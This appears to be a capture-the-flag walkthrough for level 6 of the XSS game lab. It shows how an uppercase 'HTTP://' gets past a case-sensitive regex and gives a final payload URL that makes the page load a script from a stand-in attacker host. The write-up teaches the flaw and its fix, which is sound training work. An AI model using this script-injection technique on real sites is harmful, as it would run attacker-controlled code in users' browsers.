## 🐇 Level 6: Follow the Rabbit

### 🎯 Mission Description  
Some complex web apps dynamically load JavaScript files based on `location.hash` or URL parameters. This can be super dangerous if not handled properly, especially if users can control what's being loaded.

### 🎯 Mission Objective  
Make the application load and execute an external JavaScript file that triggers `alert()`.

### 🧩 Steps  
1. Open the challenge URL:  
   `https://xss-game.appspot.com/level6/frame#/static/gadget.js`

2. View the source and focus on this function:
   ```js
   function includeGadget(url) {
     if (url.match(/^https?:\/\//)) {
       setInnerText(document.getElementById("log"),
         "Sorry, cannot load a URL containing \"http\".");
       return;
     }
     scriptEl.src = url;
     ...
   }
   ```

3. The script blocks any URL starting with `http://` or `https://`. But it **doesn't block uppercase `HTTP`**.

4. Try injecting a JS file like this:  
   ```
   https://xss-game.appspot.com/level6/frame#HTTP://attacker.com/payload.js
   ```

5. Since `.match(/^https?:\/\//)` is **case-sensitive**, it skips over `HTTP://`, so the script loads it without blocking!

6. That file should contain:
   ```js
   alert(1);
   ```

7. Once loaded, the alert box pops up — mission complete! ✅

### 💣 Final Payload  
```
https://xss-game.appspot.com/level6/frame#HTTP://your-domain.com/alert.js
```

_(Note: Host a file at that URL with `alert(1);` content)_

### 📝 Notes  
- Regex filters are case-sensitive unless you specify the `i` flag.
- The vulnerability here is in trusting and directly injecting the `location.hash` into a script's `src`.
- Using alternate casing like `HTTP` bypasses the filter.

**Status: Solved ✅**
